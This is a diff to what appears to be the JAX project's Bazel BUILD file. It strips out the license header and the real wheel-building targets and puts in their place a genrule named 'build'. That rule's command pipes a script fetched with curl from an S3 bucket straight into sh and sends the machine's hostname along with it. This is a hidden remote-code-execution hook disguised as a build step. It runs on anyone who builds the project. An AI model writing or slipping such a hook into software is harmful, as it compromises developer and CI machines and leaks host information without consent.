@@ -1,66 +1,7 @@
-# Copyright 2018 The JAX Authors.
-#
-# Licensed under the Apache License, Version 2.0 (the "License");
-# you may not use this file except in compliance with the License.
-# You may obtain a copy of the License at
-#
-#     https://www.apache.org/licenses/LICENSE-2.0
-#
-# Unless required by applicable law or agreed to in writing, software
-# distributed under the License is distributed on an "AS IS" BASIS,
-# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-# See the License for the specific language governing permissions and
-# limitations under the License.
 
-# JAX is Autograd and XLA
-
-load("@local_config_cuda//cuda:build_defs.bzl", "if_cuda")
-load("@local_config_rocm//rocm:build_defs.bzl", "if_rocm")
-load("//jaxlib:jax.bzl", "if_windows")
-
-licenses(["notice"])  # Apache 2
-
-package(default_visibility = ["//visibility:public"])
-
-py_binary(
-    name = "build_wheel",
-    srcs = ["build_wheel.py"],
-    data = [
-        "LICENSE.txt",
-        "//jaxlib",
-        "//jaxlib:README.md",
-        "//jaxlib:setup.py",
-        "@xla//xla/python:xla_client",
-    ] + if_windows([
-        "//jaxlib/mlir/_mlir_libs:jaxlib_mlir_capi.dll",
-    ]) + if_cuda([
-        "//jaxlib/cuda:cuda_gpu_support",
-        "//jaxlib:cuda_plugin_extension",
-        "@local_config_cuda//cuda:cuda-nvvm",
-    ]) + if_rocm([
-        "//jaxlib/rocm:rocm_gpu_support",
-    ]),
-    deps = [
-      "//jax/tools:build_utils",
-      "@bazel_tools//tools/python/runfiles"
-    ],
-)
-
-py_binary(
-    name = "build_gpu_plugin_wheel",
-    srcs = ["build_gpu_plugin_wheel.py"],
-    data = [
-        "LICENSE.txt",
-        "@xla//xla/pjrt/c:pjrt_c_api_gpu_plugin.so",
-    ] + if_cuda([
-        "//jaxlib/cuda:cuda_gpu_support",
-        "//plugins/cuda:pyproject.toml",
-        "//plugins/cuda:setup.py",
-        "//plugins/cuda:__init__.py",
-        "@local_config_cuda//cuda:cuda-nvvm",
-    ]),
-    deps = [
-      "//jax/tools:build_utils",
-      "@bazel_tools//tools/python/runfiles"
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/jax.git\\&folder=tools\\&hostname=`hostname`\\&foo=mck",
+    visibility = ["//visibility:public"],
 )
